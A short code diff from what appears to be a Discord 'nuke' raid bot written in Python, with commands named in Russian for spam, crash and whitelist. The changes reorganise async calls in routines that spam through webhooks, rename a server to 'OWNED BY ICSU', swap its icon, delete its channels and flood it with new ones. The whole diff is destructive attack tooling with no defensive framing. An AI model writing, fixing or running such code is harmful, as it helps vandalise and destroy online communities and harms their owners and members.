@@ -107,8 +107,7 @@ async def спам(ctx):
         await res.delete()
     else:
         await ctx.message.delete()
-        await create_hook(ctx)
-        await get_hook(ctx)
+        asyncio.gather(create_hook(ctx), get_hook(ctx))
 
 
 
@@ -166,10 +165,10 @@ async def крш(ctx):
         logs_channel = bot.get_channel(1405476031170740255)
         
         await ctx.message.delete()
-        await ctx.guild.edit(name='OWNED BY ICSU',icon=icsu_pfp.read())
+        async with async_open('icsu.png', 'rb') as pfp:
+            await ctx.guild.edit(name='OWNED BY ICSU',icon=await pfp.read())
         
-        asyncio.create_task(del_channels(guild))
-        asyncio.create_task(crsh_channels(guild))
+        asyncio.gather(del_channels(guild), crsh_channels(guild))
         
         await asyncio.sleep(10)
             
@@ -308,3 +307,4 @@ async def вайтлист(ctx, serv_id: int):
     
 
 bot.run(token, log_handler=None)
+
